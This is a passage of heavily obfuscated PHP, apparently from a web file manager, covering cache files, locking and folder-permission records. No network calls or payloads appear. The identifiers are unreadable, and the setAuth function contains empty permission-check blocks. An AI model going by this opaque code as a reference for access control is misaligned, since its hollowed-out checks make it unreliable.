$_SERVER[Ö†ØøÖ±]; $this->cachePath = $æ§Ü‘¨´[$äéä‹‡˜[84]]; $this->prefix = $äéä‹‡˜[888]; $this->cacheTime = $×Üò‡®È; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ÑĞç”¿š) { $Â¸ĞÙ¼ƒ =& $_SERVER[Ö†ØøÖ±]; $ÑĞç”¿š = str_replace(array($Â¸ĞÙ¼ƒ[889], $Â¸ĞÙ¼ƒ[97], $Â¸ĞÙ¼ƒ[73]), $Â¸ĞÙ¼ƒ[890], $ÑĞç”¿š); return $this->cachePath . $Â¸ĞÙ¼ƒ[891] . $ÑĞç”¿š . $Â¸ĞÙ¼ƒ[892]; } public function set($ñ§ùæÇà, $ŞÔÀÈß, $¢µ¤Ú× = false) { $¢µ¤Ú× = $¢µ¤Ú× ? $¢µ¤Ú× : $this->cacheTime; $åÚí»³ = $this->getFile($ñ§ùæÇà); if (file_put_contents($åÚí»³, $this->prefix . $ŞÔÀÈß, LOCK_EX)) { @touch($åÚí»³, intval(time() + $¢µ¤Ú×)); clearstatcache(); return !0; } @unlink($åÚí»³); return !1; } public function get($Œ®ûÎ…Ë) { $‚çã´Ë› = $this->getFile($Œ®ûÎ…Ë); if (file_exists($‚çã´Ë›) && filemtime($‚çã´Ë›) < time()) { @unlink($‚çã´Ë›); return !1; } $‰»²¬³ = @file_get_contents($‚çã´Ë›); return substr($‰»²¬³, strlen($this->prefix)); } public function remove($ïğùäÔ¹) { $Å’¸ÆÔ÷ = $this->getFile($ïğùäÔ¹); return @unlink($Å’¸ÆÔ÷); } public function deleteAll() { $›†®ù =& $_SERVER[Ö†ØøÖ±]; $ˆ§àê± = scandir($this->cachePath); foreach ($ˆ§àê± as $Â¼ï©òÙ) { $­¸£ë´ˆ = $this->cachePath . $Â¼ï©òÙ; if (strpos($­¸£ë´ˆ, $›†®ù[892]) && strpos($­¸£ë´ˆ, $›†®ù[893])) { @unlink($­¸£ë´ˆ); } } } public function clearTimeout() { $Í©ÑÅÚ¥ =& $_SERVER[Ö†ØøÖ±]; $Ğ¢Ö©ã = scandir($this->cachePath); foreach ($Ğ¢Ö©ã as $¡Íõ€´¨) { $¥õÄóæÔ = $this->cachePath . $¡Íõ€´¨; if (strpos($¥õÄóæÔ, $Í©ÑÅÚ¥[892]) && strpos($¥õÄóæÔ, $Í©ÑÅÚ¥[893]) && filemtime($¥õÄóæÔ) < time()) { @unlink($¥õÄóæÔ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ßÌ‹ÎÓ¿ =& $_SERVER[Ö†ØøÖ±]; if (self::$handle) { return self::$handle; } $üÈ—Ú·å = $GLOBALS[$ßÌ‹ÎÓ¿[6]][$ßÌ‹ÎÓ¿[402]]; self::$timeout = $üÈ—Ú·å[$ßÌ‹ÎÓ¿[894]] ? $üÈ—Ú·å[$ßÌ‹ÎÓ¿[894]] : 10; $¸ĞªŠÁŸ = _get($GLOBALS[$ßÌ‹ÎÓ¿[6]], $ßÌ‹ÎÓ¿[895]); $âûëøıî = $üÈ—Ú·å[$ßÌ‹ÎÓ¿[880]] ? $üÈ—Ú·å[$ßÌ‹ÎÓ¿[880]] : $ßÌ‹ÎÓ¿[214]; if ($âûëøıî == $ßÌ‹ÎÓ¿[21] && $¸ĞªŠÁŸ == $ßÌ‹ÎÓ¿[13]) { $âûëøıî = $ßÌ‹ÎÓ¿[214]; } switch ($âûëøıî) { case $ßÌ‹ÎÓ¿[883]: self::$handle = new CacheLockRedis(); break; case $ßÌ‹ÎÓ¿[884]: self::$handle = new CacheLockMemcached(); break; case $ßÌ‹ÎÓ¿[21]: self::$handle = new CacheLockDatabase(); break; case $ßÌ‹ÎÓ¿[214]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ßÌ‹ÎÓ¿[896], $ßÌ‹ÎÓ¿[897]); } return self::$handle; } private static function key($«¸íÌ…Ø) { return $_SERVER[Ö†ØøÖ±][898] . Cache::key($«¸íÌ…Ø); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ıÔãµ§ù = '') { self::$errorMsg = $ıÔãµ§ù; } public static function lockGlobal($ÌæÊ„¶­, $†÷÷ñÔÛ) { return self::lock($ÌæÊ„¶­, $†÷÷ñÔÛ, !0); } public static function lock($şø¥ş×, $˜”Ğ½×ï = false, $¤©ûÓñ¾ = false) { $¸±›¼÷ =& $_SERVER[Ö†ØøÖ±]; $šøÑÎ†Ø = self::init(); $¥°ÄöÙ” = self::key($şø¥ş×); $˜”Ğ½×ï = $˜”Ğ½×ï ? $˜”Ğ½×ï : self::$timeout; $«Æ‹¶ôˆ = timeFloat(); $ªíºö™Ê = $šøÑÎ†Ø->lock($¥°ÄöÙ”, $˜”Ğ½×ï); $—ƒòÌíµ = timeFloat(); if (!$ªíºö™Ê) { $ì‡¯·ù = "\x6c\x6f\143\x6b\x20\x65\x72\162\x6f\162\73\x6b\x65\x79\75{$şø¥ş×}\x3b\x74\x69\155\145\75{$˜”Ğ½×ï}\73" . self::$errorMsg . $¸±›¼÷[71] . get_caller_msg(); $Íµ©ñÁ° = LNG($¸±›¼÷[899]) . "\50{$˜”Ğ½×ï}\163\x29\56" . LNG($¸±›¼÷[900]); $Íµ©ñÁ° .= $¸±›¼÷[901]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Íµ©ñÁ° = $Íµ©ñÁ° . $¸±›¼÷[902] . self::$errorMsg; } write_log($¸±›¼÷[903] . sprintf($¸±›¼÷[904], timeFloat() - $«Æ‹¶ôˆ) . $¸±›¼÷[905] . $ì‡¯·ù . $¸±›¼÷[906] . error_get_last(), $¸±›¼÷[897]); show_json($Íµ©ñÁ°, !1); } if (!$¤©ûÓñ¾) { self::$lockItem[$¥°ÄöÙ”] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $œË²À’ = number_format(timeFloat() - $—ƒòÌíµ, 3); write_log($¸±›¼÷[907] . $şø¥ş× . $¸±›¼÷[908] . $œË²À’, $¸±›¼÷[897]); } return $ªíºö™Ê; } public static function lockGet($Áå“¢üÙ) { $öğ³Ó€è = self::key($Áå“¢üÙ); if (self::$lockItem[$öğ³Ó€è]) { return self::$lockItem[$öğ³Ó€è]; } return self::init()->lockGet($öğ³Ó€è); } public static function unlock($¼º‚šÌ•) { $²ÉğÃ Ú =& $_SERVER[Ö†ØøÖ±]; $í†«·ò‰ = self::key($¼º‚šÌ•); self::$lockItem[$í†«·ò‰] = null; self::init()->unlock($í†«·ò‰); if (GLOBAL_DEBUG_LOG_ALL) { write_log($²ÉğÃ Ú[909] . $¼º‚šÌ•, $²ÉğÃ Ú[897]); } return; } public static function unlockRuntime() { $“‰ò•×ü =& $_SERVER[Ö†ØøÖ±]; $¬Èßê«µ = self::init(); $´ß¨´µ« = !1; foreach (self::$lockItem as $ÔŸÆÄğ† => $ƒÌÙã) { if (!$ƒÌÙã) { continue; } $¬Èßê«µ->unlock($ÔŸÆÄğ†); if (!$´ß¨´µ«) { $´ß¨´µ« = !0; write_log($“‰ò•×ü[910] . $ÔŸÆÄğ† . $“‰ò•×ü[71] . get_caller_msg(), $“‰ò•×ü[897]); continue; } write_log($“‰ò•×ü[910] . $ÔŸÆÄğ†, $“‰ò•×ü[897]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¿‘„”ë£ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($“‰ò•×ü[911] . $¿‘„”ë£ . $“‰ò•×ü[912] . ACTION, $“‰ò•×ü[897]); } } public static function fileLock($Š˜ùå°Ò) { $é¦½¦Æ© =& $_SERVER[Ö†ØøÖ±]; if (!$GLOBALS[$é¦½¦Æ©[913]]) { $GLOBALS[$é¦½¦Æ©[913]] = array(); } $GLOBALS[$é¦½¦Æ©[913]][$Š˜ùå°Ò] = !1; $Á†Ú»û¡ = fopen(DATA_PATH . $Š˜ùå°Ò . $é¦½¦Æ©[914], $é¦½¦Æ©[915]); if (!$Á†Ú»û¡) { return !1; } $GLOBALS[$é¦½¦Æ©[913]][$Š˜ùå°Ò] = $Á†Ú»û¡; if (flock($Á†Ú»û¡, LOCK_EX)) { return !0; } self::unlock($Š˜ùå°Ò); show_json($é¦½¦Æ©[916], !1); return !1; } public static function fileUnlock($ªíäÛ¢œ) { $¤¢Ê¨‘¹ =& $_SERVER[Ö†ØøÖ±]; $¨ë•ŠÅ³ = $GLOBALS[$¤¢Ê¨‘¹[913]][$ªíäÛ¢œ]; if (!$¨ë•ŠÅ³) { return; } $GLOBALS[$¤¢Ê¨‘¹[913]][$ªíäÛ¢œ] = !1; flock($¨ë•ŠÅ³, LOCK_UN); fclose($¨ë•ŠÅ³); } public static function fileUnlockAll() { $ëıá“øÚ =& $_SERVER[Ö†ØøÖ±]; if (!$GLOBALS[$ëıá“øÚ[913]]) { return; } foreach ($GLOBALS[$ëıá“øÚ[913]] as $¦Âì– é => $Üã»Á¡–) { if (!$Üã»Á¡–) { continue; } $GLOBALS[$ëıá“øÚ[913]][$¦Âì– é] = !1; flock($Üã»Á¡–, LOCK_UN); fclose($Üã»Á¡–); } $GLOBALS[$ëıá“øÚ[913]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto fÄ¨„ ŠÆ¼; BŸ·Îàè¶: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\145\x5f\141\x75\x74\150"; public function getAuth($˜çòÊÄ) { $ÕÄ™¢ï =& $_SERVER[Ö†ØøÖ±]; $¥¸ÄŸŞ® = $this->sourceAuthSelect($˜çòÊÄ); $§†İï‘ı = array(); $õĞŒß = array(); $¿Ú‰……› = 2 << 25; foreach ($¥¸ÄŸŞ® as $¬üÁ‚û) { $ƒÃ×©×Œ = Model($ÕÄ™¢ï[549])->listData($¬üÁ‚û[$ÕÄ™¢ï[2001]]); if (!$ƒÃ×©×Œ) { continue; } $§†İï‘ı[] = $¬üÁ‚û; $Â‹š…½™ = 0; if ($¬üÁ‚û[$ÕÄ™¢ï[178]] == SourceModel::TYPE_GROUP) { $Â‹š…½™ = $¿Ú‰……› * 2; } if ($¬üÁ‚û[$ÕÄ™¢ï[178]] == SourceModel::TYPE_USER) { $Â‹š…½™ = $¿Ú‰……›; } if ($¬üÁ‚û[$ÕÄ™¢ï[178]] == SourceModel::TYPE_USER && $¬üÁ‚û[$ÕÄ™¢ï[547]] == $ÕÄ™¢ï[212]) { $Â‹š…½™ = 0; } $õĞŒß[] = $ƒÃ×©×Œ[$ÕÄ™¢ï[464]] + $Â‹š…½™; } array_multisort($õĞŒß, SORT_DESC, $§†İï‘ı); return $§†İï‘ı; } public function sourceAuthSelect($æœº¦Ûç) { $îäÅàóë =& $_SERVER[Ö†ØøÖ±]; static $­ÃŸ†“Ó = array(); $Çû«Ú„  = is_array($æœº¦Ûç) ? !1 : !0; if ($Çû«Ú„ ) { $æœº¦Ûç = array($æœº¦Ûç); } $¸÷Å¶”Ø = array(); foreach ($æœº¦Ûç as $“ŒÉã–) { if (isset($­ÃŸ†“Ó[$“ŒÉã–])) { $¸÷Å¶”Ø[$“ŒÉã–] = $­ÃŸ†“Ó[$“ŒÉã–]; } } if (count($¸÷Å¶”Ø) == count($æœº¦Ûç)) { return $Çû«Ú„  ? $¸÷Å¶”Ø[$æœº¦Ûç[0]] : $¸÷Å¶”Ø; } $Áî‚ë‰ó = $îäÅàóë[2078]; $­§¶•ê¼ = array($îäÅàóë[181] => array($îäÅàóë[7], $æœº¦Ûç)); $ş¸¶İ³ô = $this->field($Áî‚ë‰ó)->order($îäÅàóë[451])->where($­§¶•ê¼)->select(); $˜œ®êŸ = array_to_keyvalue_group($ş¸¶İ³ô, $îäÅàóë[181]); foreach ($æœº¦Ûç as $“ŒÉã–) { $­ÃŸ†“Ó[$“ŒÉã–] = $˜œ®êŸ[$“ŒÉã–] ? $˜œ®êŸ[$“ŒÉã–] : array(); } if ($Çû«Ú„ ) { return $ş¸¶İ³ô; } return $˜œ®êŸ; } public function setAuth($¯¨Ş“É¾, $•åÛ®´ƒ) { $Ú÷ƒŒÖ =& $_SERVER[Ö†ØøÖ±]; $·ÆŒæ£ı = Model($Ú÷ƒŒÖ[1385])->sourceInfo($¯¨Ş“É¾); if (!$·ÆŒæ£ı) { return !1; } if ($·ÆŒæ£ı[$Ú÷ƒŒÖ[178]] != SourceModel::TYPE_GROUP) { return !1; } $éêÂÆ»“ = 1; $éğÛª¸ = $·ÆŒæ£ı[$Ú÷ƒŒÖ[547]]; if ($éğÛª¸ != $éêÂÆ»“) { $ óÄ´À× = array($Ú÷ƒŒÖ[1897] => $éğÛª¸); $â†³ü­ü = Model($Ú÷ƒŒÖ[1987])->field($Ú÷ƒŒÖ[1699])->where($ óÄ´À×)->select(); $â†³ü­ü = array_to_keyvalue($â†³ü­ü, $Ú÷ƒŒÖ[12], $Ú÷ƒŒÖ[1699]); } $˜ö”…á¶ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $´–ÛÑ = array(); foreach ($•åÛ®´ƒ as $ªÉãÁÔ) { if (!in_array($ªÉãÁÔ[$Ú÷ƒŒÖ[178]], $˜ö”…á¶)) { show_json(LNG($Ú÷ƒŒÖ[2079]), !1); } if ($éğÛª¸ != $éêÂÆ»“) { if ($ªÉãÁÔ[$Ú÷ƒŒÖ[178]] == SourceModel::TYPE_GROUP) { } if ($ªÉãÁÔ[$Ú÷ƒŒÖ[547]] != 0 && !in_array($ªÉãÁÔ[$Ú÷ƒŒÖ[547]], $â†³ü­ü)) { } } if ($ªÉãÁÔ[$Ú÷ƒŒÖ[547]] == 0) { $ªÉãÁÔ[$Ú÷ƒŒÖ[178]] = SourceModel::TYPE_USER; } $´–ÛÑ[] = array($Ú÷ƒŒÖ[181] => $¯¨Ş“É¾, $Ú÷ƒŒÖ[178] => intval($ªÉãÁÔ[$Ú÷ƒŒÖ[178]]), $Ú÷ƒŒÖ[547] => intval($ªÉãÁÔ[$Ú÷ƒŒÖ[547]]), $Ú÷ƒŒÖ[2001] => intval($ªÉãÁÔ[$Ú÷ƒŒÖ[2001]]) ? intval($ªÉãÁÔ[$Ú÷ƒŒÖ[2001]]) : 0, $Ú÷ƒŒÖ[2061] => intval($ªÉãÁÔ[$Ú÷ƒŒÖ[2061]]) ? intval($ªÉãÁÔ[$Ú÷ƒŒÖ[2061]]) : -1); } $this->where(array($Ú÷ƒŒÖ[468] => $¯¨Ş“É¾))->delete(); $this->addAll($´–ÛÑ); return !0; } public function authClear($ÍÈùÕ™Ş) { $ˆ ‡‚€¨ =& $_SERVER[Ö†ØøÖ±]; $§çéò†¦ = Model($ˆ ‡‚€¨[1385])->sourceInfo($ÍÈùÕ™Ş); $¥²»á—ù = array($ÍÈùÕ™Ş); if ($§çéò†¦[$ˆ ‡‚€¨[462]] == $ˆ ‡‚€¨[88]) { $ïİşØ² = array($ˆ ‡‚€¨[629] => array($ˆ ‡‚€¨[589], $§çéò†¦[$ˆ ‡‚€¨[562]] . $ÍÈùÕ™Ş . $ˆ ‡‚€¨[590])); $¥²»á—ù = Model($ˆ ‡‚€¨[1385])->field($ˆ ‡‚€¨[468])->where($ïİşØ²)->getField($ˆ ‡‚€¨[181], !0); $¥²»á—ù[] = $ÍÈùÕ™Ş; } $this->where(array($ˆ ‡‚€¨[468] => array($ˆ ‡‚€¨[469], $¥²»á—ù)))->delete(); return !0; } public function getAllChildren($”ˆå·Ñ´) { $Õ°óÀ‚ä =& $_SERVER[Ö†ØøÖ±]; $ßÈœ”µ˜ = Model($Õ°óÀ‚ä[1385])->sourceInfo($”ˆå·Ñ´); if ($ßÈœ”µ˜[$Õ°óÀ‚ä[462]] != $Õ°óÀ‚ä[88]) { return $this->sourceListAuth(array($”ˆå·Ñ´)); } if ($ßÈœ”µ˜[$Õ°óÀ‚ä[178]] != SourceModel::TYPE_GROUP) { return array(); } $åÔŠ­³± = 1; $´óõ™¹¡ = array($”ˆå·Ñ´); if ($ßÈœ”µ˜[$Õ°óÀ‚ä[180]] == $Õ°óÀ‚ä[212] && $ßÈœ”µ˜[$Õ°óÀ‚ä[547]] != $åÔŠ­³±) { $´óõ™¹¡ = $this->groupChidldAllRootSource($ßÈœ”µ˜[$Õ°óÀ‚ä[547]]); } $‰¼ƒÆş› = $this->field($Õ°óÀ‚ä[181])->group($Õ°óÀ‚ä[181])->select(); $‰¼ƒÆş› = array_to_keyvalue($‰¼ƒÆş›, $Õ°óÀ‚ä[12], $Õ°óÀ‚ä[181]); if (!$‰¼ƒÆş›) { return array(); } $‹œø¼µ‡ = $Õ°óÀ‚ä[2080]; $È±µÄ™— = array($Õ°óÀ‚ä[181] => array($Õ°óÀ‚ä[7], $‰¼ƒÆş›), $Õ°óÀ‚ä[482] => $Õ°óÀ‚ä[212]); $¶Ô‰Ã°Ó = Model($Õ°óÀ‚ä[878])->field($‹œø¼µ‡)->where($È±µÄ™—)->select(); $ëáøöÙÔ = array($”ˆå·Ñ´); foreach ($¶Ô‰Ã°Ó as $ŠöÄßÉô) { foreach ($´óõ™¹¡ as $±”ÁÇÏ¼) { $Ú÷Æ±ó± = $Õ°óÀ‚ä[50] . $±”ÁÇÏ¼ . $Õ°óÀ‚ä[50]; $Ìó–Ü×½ = $ŠöÄßÉô[$Õ°óÀ‚ä[562]] . $ŠöÄßÉô[$Õ°óÀ‚ä[181]] . $Õ°óÀ‚ä[50]; if (strstr($Ìó–Ü×½, $Ú÷Æ±ó±)) { $ëáøöÙÔ[] = $ŠöÄßÉô[$Õ°óÀ‚ä[181]]; break; } } } return $this->sourceListAuth($ëáøöÙÔ); } private function sourceListAuth($ ºÆ†öï) { $‡¼İœ× =& $_SERVER[Ö†ØøÖ±]; $ó°È‹æ÷ = Model($‡¼İœ×[1385])->sourceListInfo($ ºÆ†öï, !0); $³¯âÆÕ = $this->sourceAuthSelect($ ºÆ†öï); $Ãåİøß = array(); $Ü“ÄĞÚú = array(); foreach ($ó°È‹æ÷ as $ÅÍº¯ë´) { unset($ÅÍº¯ë´[$‡¼İœ×[506]]); unset($ÅÍº¯ë´[$‡¼İœ×[504]]); unset($ÅÍº¯ë´[$‡¼İœ×[464]]); unset($ÅÍº¯ë´[$‡¼İœ×[87]]); $ÖåèÜà = $³¯âÆÕ[$ÅÍº¯ë´[$‡¼İœ×[181]]]; if (!$ÖåèÜà) { continue; } $ÅÍº¯ë´[$‡¼İœ×[2081]] = $this->authTargetInfo($ÖåèÜà); $ÅÍº¯ë´[$‡¼İœ×[560]] = rtrim($ÅÍº¯ë´[$‡¼İœ×[566]], $‡¼İœ×[8]) . $‡¼İœ×[8] . ltrim($ÅÍº¯ë´[$‡¼İœ×[560]], $‡¼İœ×[8]); $Ãåİøß[] = $ÅÍº¯ë´; $öÎ×¿Ø = count(explode($‡¼İœ×[8], trim($ÅÍº¯ë´[$‡¼İœ×[560]], $‡¼İœ×[8]))); $Ü“ÄĞÚú[] = $öÎ×¿Ø + ($ÅÍº¯ë´[$‡¼İœ×[33]] == $‡¼İœ×[75] ? 0 : 1000); } array_multisort($Ü“ÄĞÚú, SORT_ASC, $Ãåİøß); return $Ãåİøß; } private function groupChidldAllRootSource($Š’Â ‰Ì) { $¯ñõŞï® =& $_SERVER[Ö†ØøÖ±]; $ÎÆòˆÃê = Model($¯ñõŞï®[2082])->groupChildrenAll($Š’Â ‰Ì); $ìå¬ÍÂÔ = array($¯ñõŞï®[180] => 0, $¯ñõŞï®[547] => array($¯ñõŞï®[7], $ÎÆòˆÃê), $¯ñõŞï®[178] => SourceModel::TYPE_GROUP); $Ì½€ò¼ = Model($¯ñõŞï®[878])->field($¯ñõŞï®[181])->where($ìå¬ÍÂÔ)->select(); $Ì½€ò¼ = array_to_keyvalue($Ì½€ò¼, $¯ñõŞï®[12], $¯ñõŞï®[181]); return $Ì½€ò¼; } private function authTargetInfo($·‘§ï¾) { $‰ğş÷†‹ =& $_SERVER[Ö†ØøÖ±]; $¹ñ•¶Åñ = array(); $åÈğß¨ = array(); $¬š¼Å•­ = 2 << 25; foreach ($·‘§ï¾ as $şÈÔïí‹) { $şÇ¨Ÿé = Model($‰ğş÷†‹[549])->listData($şÈÔïí‹[$‰ğş÷†‹[2001]]); if (!$şÇ¨Ÿé) { continue; } if ($şÈÔïí‹[$‰ğş÷†‹[178]] == SourceModel::TYPE_USER) { $š©ü—ª = Model($‰ğş÷†‹[555])->getInfoSimpleOuter($şÈÔïí‹[$‰ğş÷†‹[547]]); if ($š©ü—ª[$‰ğş÷†‹[1699]] == $‰ğş÷†‹[1241]) { continue; } if ($š©ü—ª[$‰ğş÷†‹[1699]] == $‰ğş÷†‹[212]) { $š©ü—ª[$‰ğş÷†‹[32]] = LNG($‰ğş÷†‹[2083]); } } else { $š©ü—ª = Model($‰ğş÷†‹[563])->getInfoSimple($şÈÔïí‹[$‰ğş÷†‹[547]]); } if (!$š©ü—ª) { continue; } $š©ü—ª[$‰ğş÷†‹[517]] = $şÇ¨Ÿé; $¹ñ•¶Åñ[] = $š©ü—ª; $ä„Á¾š‡ = 0; if ($şÈÔïí‹[$‰ğş÷†‹[178]] == SourceModel::TYPE_GROUP) { $ä„Á¾š‡ = $¬š¼Å•­ * 2; } if ($şÈÔïí‹[$‰ğş÷†‹[178]] == SourceModel::TYPE_USER) { $ä„Á¾š‡ = $¬š¼Å•­; } if ($şÈÔïí‹[$‰ğş÷†‹[178]] == SourceModel::TYPE_USER && $şÈÔïí‹[$‰ğş÷†‹[547]] == $‰ğş÷†‹[212]) { $ä„Á¾š‡ = 0; } $åÈğß¨[] = $şÇ¨Ÿé[$‰ğş÷†‹[464]] + $ä„Á¾š‡; } array_multisort($åÈğß¨, SORT_DESC, $¹ñ•¶Åñ); return $¹ñ•¶Åñ; } public function getAllChildrenByUser($½µ«¦ü”, $œÅéÍóÙ) { $ª¼àëÍ¯ =& $_SERVER[Ö†ØøÖ±]; $–½£ı– = Model($ª¼àëÍ¯[576])->getInfo($œÅéÍóÙ); if (!$œÅéÍóÙ || !$½µ«¦ü” || !$–½£ı–) { return array(); } $í‘ÉÁç = Model($ª¼àëÍ¯[1385])->sourceInfo($½µ«¦ü”); $şâı’ñ = array(); $¡ÎÁƒ‚Ì = 1; if ($í‘ÉÁç[$ª¼àëÍ¯[180]] == $ª¼àëÍ¯[212] && $í‘ÉÁç[$ª¼àëÍ¯[547]] != $¡ÎÁƒ‚Ì && $this->groupContainUser($í‘ÉÁç[$ª¼àëÍ¯[547]], $œÅéÍóÙ)) { foreach ($–½£ı–[$ª¼àëÍ¯[2084]] as $æ˜ŞµŠ·) { $¯‰ùéÍ = Model($ª¼àëÍ¯[563])->getInfo($æ˜ŞµŠ·[$ª¼àëÍ¯[1897]]); $‡¤®ş“ = Model($ª¼àëÍ¯[576])->getInfoSimpleOuter($œÅéÍóÙ); $‡¤®ş“[$ª¼àëÍ¯[517]] = $æ˜ŞµŠ·[$ª¼àëÍ¯[464]]; if (Model($ª¼àëÍ¯[549])->authCheckAction($æ˜ŞµŠ·[$ª¼àëÍ¯[464]][$ª¼àëÍ¯[464]], $ª¼àëÍ¯[1918])) { continue; } $Ú¤Æì‚ê = array($ª¼àëÍ¯[32] => $ª¼àëÍ¯[1261] . $¯‰ùéÍ[$ª¼àëÍ¯[32]], $ª¼àëÍ¯[181] => $¯‰ùéÍ[$ª¼àëÍ¯[87]][$ª¼àëÍ¯[181]], $ª¼àëÍ¯[84] => KodIO::make($¯‰ùéÍ[$ª¼àëÍ¯[87]][$ª¼àëÍ¯[181]]), $ª¼àëÍ¯[180] => $ª¼àëÍ¯[212], $ª¼àëÍ¯[178] => $ª¼àëÍ¯[556], $ª¼àëÍ¯[33] => $ª¼àëÍ¯[593], $ª¼àëÍ¯[560] => $¯‰ùéÍ[$ª¼àëÍ¯[567]], $ª¼àëÍ¯[1897] => $¯‰ùéÍ[$ª¼àëÍ¯[1897]], $ª¼àëÍ¯[564] => $¯‰ùéÍ[$ª¼àëÍ¯[180]], $ª¼àëÍ¯[2081] => array($‡¤®ş“)); $şâı’ñ[$Ú¤Æì‚ê[$ª¼àëÍ¯[181]]] = $Ú¤Æì‚ê; } } $äÉó«Ù¯ = array(); $×ĞØ ı = $this->getAllChildren($½µ«¦ü”); foreach ($×ĞØ ı as $ºç¡øàë) { $©»éÉ§Ö = !1; foreach ($ºç¡øàë[$ª¼àëÍ¯[2081]] as $¤¢¤‹µ€) { if ($¤¢¤‹µ€[$ª¼àëÍ¯[1699]]) { if ($¤¢¤‹µ€[$ª¼àëÍ¯[1699]] == $œÅéÍóÙ) { $©»éÉ§Ö = !0; break; } } if ($¤¢¤‹µ€[$ª¼àëÍ¯[1897]]) { if ($this->groupContainUser($¤¢¤‹µ€[$ª¼àëÍ¯[1897]], $œÅéÍóÙ)) { $©»éÉ§Ö = !0; break; } } } if ($©»éÉ§Ö) { $äÉó«Ù¯[] = $ºç¡øàë; } $¹¹ê±‚ = $ºç¡øàë[$ª¼àëÍ¯[181]]; if (isset($şâı’ñ[$¹¹ê±‚])) { $ºç¡øàë[$ª¼àëÍ¯[2081]][] = $şâı’ñ[$¹¹ê±‚][0]; $şâı’ñ[$¹¹ê±‚] = !1; } } $şâı’ñ = array_filter(array_values($şâı’ñ)); $äÉó«Ù¯ = array_merge($şâı’ñ, $äÉó«Ù¯); return $äÉó«Ù¯; } public function setAllChildrenByUser($şŸö‹Îã, $ñ¢ÅŞ»ù, $’˜¦Ì¯) { $‘ÛÄ‰ =& $_SERVER[Ö†ØøÖ±]; $Åîœšì = $this->getAllChildrenByUser($şŸö‹Îã, $ñ¢ÅŞ»ù); if (!$’˜¦Ì¯ || !$Åîœšì) { return !1; } foreach ($Åîœšì as $¹÷©îÃ³) { $ëÒƒÂ—Í = array(); foreach ($¹÷©îÃ³[$‘ÛÄ‰[2081]] as $×…»©»”) { $ş­ÃÎı = $×…»©»”[$‘ÛÄ‰[517]]; $è˜Ò¡ƒ• = $×…»©»”[$‘ÛÄ‰[1699]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $È··êûå = $×…»©»”[$‘ÛÄ‰[1699]] ? $×…»©»”[$‘ÛÄ‰[1699]] : $×…»©»”[$‘ÛÄ‰[1897]]; if ($×…»©»”[$‘ÛÄ‰[1699]] && $×…»©»”[$‘ÛÄ‰[1699]] == $ñ¢ÅŞ»ù) { continue; } $ëÒƒÂ—Í[] = array($‘ÛÄ‰[181] => $¹÷©îÃ³[$‘ÛÄ‰[181]], $‘ÛÄ‰[178] => $è˜Ò¡ƒ•, $‘ÛÄ‰[547] => intval($È··êûå), $‘ÛÄ‰[2001] => isset($ş­ÃÎı[$‘ÛÄ‰[451]]) ? intval($ş­ÃÎı[$‘ÛÄ‰[451]]) : 0, $‘ÛÄ‰[2061] => isset($ş­ÃÎı[$‘ÛÄ‰[2061]]) ? intval($ş­ÃÎı[$‘ÛÄ‰[2061]]) : -1); } $ëÒƒÂ—Í[] = array($‘ÛÄ‰[181] => $¹÷©îÃ³[$‘ÛÄ‰[181]], $‘ÛÄ‰[178] => SourceModel::TYPE_USER, $‘ÛÄ‰[547] => intval($ñ¢ÅŞ»ù), $‘ÛÄ‰[2001] => intval($’˜¦Ì¯), $‘ÛÄ‰[2061] => -1); $this->where(array($‘ÛÄ‰[468] => $¹÷©îÃ³[$‘ÛÄ‰[181]]))->delete(); $this->addAll($ëÒƒÂ—Í); } return !0; } public function get($«¬¶‘ûù) { $ıÃ¦ëÀ« = $this->getSourceList(array($«¬¶‘ûù), !0); return $ıÃ¦ëÀ«[0]; } public function getSourceList($ÔÒÏîù÷, $ü”ŠÃ¯• = false, $…™·½½ª = false) { $ïéÚĞ®ó =& $_SERVER[Ö†ØøÖ±]; if (!$ÔÒÏîù÷) { return array(); } $³Úù™ = Model($ïéÚĞ®ó[1385]); if (!$ü”ŠÃ¯• && count($ÔÒÏîù÷) == 1) { $ü”ŠÃ¯• = array(); $ü”ŠÃ¯•[$ÔÒÏîù÷[0]] = $³Úù™->sourceInfo($ÔÒÏîù÷[0]); } if (!$ü”ŠÃ¯•) { $¥×á€£¸ = array($ïéÚĞ®ó[468] => array($ïéÚĞ®ó[469], $ÔÒÏîù÷)); $ü”ŠÃ¯• = $³Úù™->field($ïéÚĞ®ó[2085])->where($¥×á€£¸)->select(); $ü”ŠÃ¯• = array_to_keyvalue($ü”ŠÃ¯•, $ïéÚĞ®ó[181]); } $Æà˜¹÷Â = $ÔÒÏîù÷; foreach ($ü”ŠÃ¯• as $ûüÊüß => $–Íİä«é) { $ßõ²Ò¡Ö = $³Úù™->parentLevelArray($–Íİä«é[$ïéÚĞ®ó[562]]); $Æà˜¹÷Â = array_merge($Æà˜¹÷Â, array($ûüÊüß), array_reverse($ßõ²Ò¡Ö)); } $Æà˜¹÷Â = array_values(array_unique($Æà˜¹÷Â)); if (!$Æà˜¹÷Â) { return array(); } $¬ç–¯Çæ = $this->sourceAuthSelect($Æà˜¹÷Â); $†±ñİ“Ç = array(); foreach ($Æà˜¹÷Â as $õ›èìßÏ) { if (isset($¬ç–¯Çæ[$õ›èìßÏ])) { $†±ñİ“Ç[$õ›èìßÏ] = $¬ç–¯Çæ[$õ›èìßÏ]; } } $î“Ïş®á = $this->userIsRoot($…™·½½ª); $ñÖ³Œ¼ü = AuthModel::authAll(); $„’˜’· = array($ïéÚĞ®ó[465] => $ñÖ³Œ¼ü, $ïéÚĞ®ó[2086] => array($ïéÚĞ®ó[470] => 0, $ïéÚĞ®ó[1903] => $ñÖ³Œ¼ü, $ïéÚĞ®ó[471] => LNG($ïéÚĞ®ó[2087]), $ïéÚĞ®ó[1920] => 